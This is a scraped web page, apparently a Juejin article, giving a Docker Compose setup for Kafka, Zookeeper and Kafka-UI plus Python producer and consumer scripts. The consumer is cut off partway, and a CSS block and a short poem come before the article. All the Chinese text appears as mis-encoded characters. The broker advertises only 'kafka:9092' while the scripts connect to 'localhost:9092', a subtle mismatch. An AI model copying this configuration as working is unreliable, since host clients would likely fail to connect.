h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ˜¥é£æ‹‚æŸ³ç»¿çƒŸè½»ï¼Œ<br/>
èŠ±å½±æµèºæ»¡å²¸ç”Ÿã€‚<br/>
ä¸€å¤œé›¨å£°å‚¬ä¸‡ç‰©ï¼Œ<br/>
ä¸œé£åˆæŠŠæ—§å±±æ˜ã€‚</p>
<p>å¤äº‘å·å°½å¤©å¿ƒè¿œï¼Œ<br/>
è·å¶æ— å°˜æ˜ æ°´æ¸…ã€‚<br/>
è›™å”±ç¨»é¦™çœ æœˆä¸‹ï¼Œ<br/>
é“¶æ²³å€’æ˜ æ¢¦åˆæˆã€‚</p>
<p>ç§‹æ¥éœœæŸ“æ«å¦‚ç«ï¼Œ<br/>
é›å½±æƒŠå¯’ç…§ç¢§æ™´ã€‚<br/>
ä¸€å£¶æ–°é…’é‚€æ˜æœˆï¼Œ<br/>
é»„å¶é£˜é›¶ä¸æ‹åº­ã€‚</p>
<p>å†¬é›ªæ¶ˆå£°å¤©åœ°å¯‚ï¼Œ<br/>
æ¾ææŒ‚ç‰å¤œæ— å£°ã€‚<br/>
æ¢…èŠ±ä¸‰å¼„é¦™çŠ¹åœ¨ï¼Œ<br/>
ç¬‘å¯¹æµå¹´ä¸‡å¤æƒ…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿]]></title>    <link>https://juejin.cn/post/7592451588848435219</link>    <guid>https://juejin.cn/post/7592451588848435219</guid>    <pubDate>2026-01-08T02:22:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848435219" data-draft-id="7592452108798476331" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿"/> <meta itemprop="keywords" content="Kafka,Docker"/> <meta itemprop="datePublished" content="2026-01-08T02:22:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†°å—çš„æ—…è¡Œ"/> <meta itemprop="url" content="https://juejin.cn/user/3773179636746007"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179636746007/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†°å—çš„æ—…è¡Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:22:37.000Z" title="Thu Jan 08 2026 02:22:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿</h2>
<p>æä¾›ä¸€ä¸ªå®Œæ•´çš„ã€ç»è¿‡éªŒè¯çš„Docker Composeéƒ¨ç½²æ–¹æ¡ˆï¼ŒåŒ…æ‹¬Kafkaé›†ç¾¤å’ŒKafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿ï¼Œä»¥åŠPython Kafkaç”Ÿäº§æ¶ˆè´¹ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€éƒ¨ç½²Kafkaä¸Kafka-UI</h3>
<h4 data-id="heading-2">1. åˆ›å»ºç›®å½•ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p kafka-compose &amp;&amp; <span class="hljs-built_in">cd</span> kafka-compose
</code></pre>
<h4 data-id="heading-3">2. åˆ›å»ºdocker-compose.ymlæ–‡ä»¶</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.5'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">zookeeper:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/zookeeper</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">zookeeper</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"2181:2181"</span>
  
  <span class="hljs-attr">kafka:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/kafka</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9092:9092"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="hljs-string">zookeeper:2181</span>
      <span class="hljs-attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="hljs-string">INSIDE://kafka:9092</span>
      <span class="hljs-attr">KAFKA_LISTENERS:</span> <span class="hljs-string">INSIDE://0.0.0.0:9092</span>
      <span class="hljs-attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="hljs-string">INSIDE:PLAINTEXT</span>
      <span class="hljs-attr">KAFKA_LISTENER_NAME_SELECTOR:</span> <span class="hljs-string">INSIDE</span>
      <span class="hljs-attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="hljs-string">INSIDE</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">zookeeper</span>
  
  <span class="hljs-attr">kafka-ui:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">provectuslabs/kafka-ui</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka-ui</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">DYNAMIC_CONFIG_ENABLED:</span> <span class="hljs-string">'true'</span>
      <span class="hljs-attr">KAFKA_CLUSTERS_0_NAME:</span> <span class="hljs-string">local</span>
      <span class="hljs-attr">KAFKA_CLUSTERS_0_BOOTSTRAP_SERVERS:</span> <span class="hljs-string">kafka:9092</span>
</code></pre>
<h4 data-id="heading-4">3. å¯åŠ¨æœåŠ¡</h4>
<pre><code class="hljs">docker-compose up -d
</code></pre>
<h4 data-id="heading-5">4. éªŒè¯æœåŠ¡çŠ¶æ€</h4>
<pre><code class="hljs">docker-compose ps
</code></pre>
<h4 data-id="heading-6">5. è®¿é—®Kafka-UI</h4>
<p>æ‰“å¼€æµè§ˆå™¨è®¿é—® <code>http://localhost:8080</code>ï¼Œå³å¯çœ‹åˆ°Kafka-UIçš„ç™»å½•ç•Œé¢ã€‚é¦–æ¬¡ç™»å½•æ— éœ€è´¦å·å¯†ç ï¼Œç›´æ¥è¿›å…¥ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-7">äºŒã€Python Kafkaç”Ÿäº§æ¶ˆè´¹ç¤ºä¾‹</h3>
<h4 data-id="heading-8">1. å®‰è£…ä¾èµ–</h4>
<pre><code class="hljs">pip install kafka-python
</code></pre>
<h4 data-id="heading-9">2. ç”Ÿäº§è€…ä»£ç  (producer.py)</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> kafka <span class="hljs-keyword">import</span> KafkaProducer
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># é…ç½®KafkaæœåŠ¡å™¨åœ°å€</span>
BOOTSTRAP_SERVERS = [<span class="hljs-string">'localhost:9092'</span>]
TOPIC_NAME = <span class="hljs-string">'test_topic'</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_producer</span>():
    <span class="hljs-string">"""åˆ›å»ºKafkaç”Ÿäº§è€…"""</span>
    <span class="hljs-keyword">return</span> KafkaProducer(
        bootstrap_servers=BOOTSTRAP_SERVERS,
        value_serializer=<span class="hljs-keyword">lambda</span> v: json.dumps(v).encode(<span class="hljs-string">'utf-8'</span>)
    )

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_mock_data</span>():
    <span class="hljs-string">"""ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®"""</span>
    user_ids = [<span class="hljs-string">'user_001'</span>, <span class="hljs-string">'user_002'</span>, <span class="hljs-string">'user_003'</span>, <span class="hljs-string">'user_004'</span>]
    actions = [<span class="hljs-string">'click'</span>, <span class="hljs-string">'view'</span>, <span class="hljs-string">'purchase'</span>, <span class="hljs-string">'logout'</span>, <span class="hljs-string">'login'</span>]
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"user_id"</span>: random.choice(user_ids),
        <span class="hljs-string">"action"</span>: random.choice(actions),
        <span class="hljs-string">"timestamp"</span>: datetime.now().isoformat(),
        <span class="hljs-string">"value"</span>: random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)
    }

<span class="hljs-keyword">def</span> <span class="hljs-title function_">produce_data</span>(<span class="hljs-params">producer, topic</span>):
    <span class="hljs-string">"""æŒç»­ç”Ÿäº§æµ‹è¯•æ•°æ®"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># ç”Ÿæˆæ•°æ®</span>
            data = generate_mock_data()
            <span class="hljs-comment"># å‘é€æ¶ˆæ¯</span>
            producer.send(topic, value=data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Produced message: <span class="hljs-subst">{data}</span>"</span>)
            time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># æ¯ç§’å‘é€ä¸€æ¡</span>
    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Stopping producer..."</span>)
    <span class="hljs-keyword">finally</span>:
        producer.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    producer = create_producer()
    produce_data(producer, TOPIC_NAME)
</code></pre>
<h4 data-id="heading-10">3. æ¶ˆè´¹è€…ä»£ç  (consumer.py)</h4>
<pre><code class="hljs language-ini" lang="ini">from kafka import KafkaConsumer
import json

<span class="hljs-comment"># åˆ›å»ºæ¶ˆè´¹è€…å®ä¾‹å¹¶é…ç½®å‚æ•°</span>
<span class="hljs-attr">consumer</span> = KafkaConsumer(
    'test_topic',  <span class="hljs-comment"># è®¢é˜…çš„ä¸»é¢˜å</span>
    <span class="hljs-attr">bootstrap_servers</span>=[<span class="hljs-string">'localhost:9092'</span>],  <span class="hljs-comment"># KafkaæœåŠ¡å™¨åœ°å€åˆ—è¡¨</span>
    <span class="hljs-attr">group_id</span>=<span class="hljs-string">'mygroup'</span>,  <span class="hljs-comment"># æ¶ˆè´¹è€…ç»„ID</span>
    <span class="hljs-attr">auto_offset_reset</span>=<span class="hljs-string">'earliest'</span>  <span class="hljs-comment"># å½“æ²¡æœ‰åˆå§‹åç§»é‡æˆ–å½“å‰åç§»é‡æ— æ•ˆæ—¶ï¼Œè‡ªåŠ¨é‡ç½®åç§»é‡åˆ°æœ€æ—©çš„è®°å½•</span>
)

<span class="hljs-comment"># æ¶ˆè´¹æ¶ˆæ¯å¾ªç¯</span>
for message in consumer:
    <span class="hljs-comment"># è§£ææ¶ˆæ¯</span>
